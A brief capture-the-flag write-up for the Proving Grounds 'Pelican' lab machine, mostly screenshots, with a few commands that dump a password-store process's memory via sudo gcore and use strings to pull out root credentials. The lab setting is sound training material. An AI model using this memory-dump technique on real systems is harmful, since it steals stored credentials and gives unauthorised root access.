---
title: WRITE-UP PG_pelican
date: 2024-08-23 09:00:01 +0700
categories: [write up, proving ground, red team, oscp]
tags: [proving ground]     # TAG names should always be lowercase
---

# Write-up PG_pelican

* first we nmap  
  
![alt text](/assets/img/PG_pelican/image.png)

* we check and get vuln of this web

![alt text](/assets/img/PG_pelican/image-1.png)

![alt text](/assets/img/PG_pelican/image-2.png)

we can see ```password-store``` in ```suid```
dump ```pid``` gcore to get root

```
ps -ef | grep password store

sudo gcore 513

strings core.513
```
now we get credential to get root

![alt text](/assets/img/PG_pelican/image-3.png)

![alt text](/assets/img/PG_pelican/image-4.png)

GG
![alt text](/assets/img/PG_pelican/image-5.png)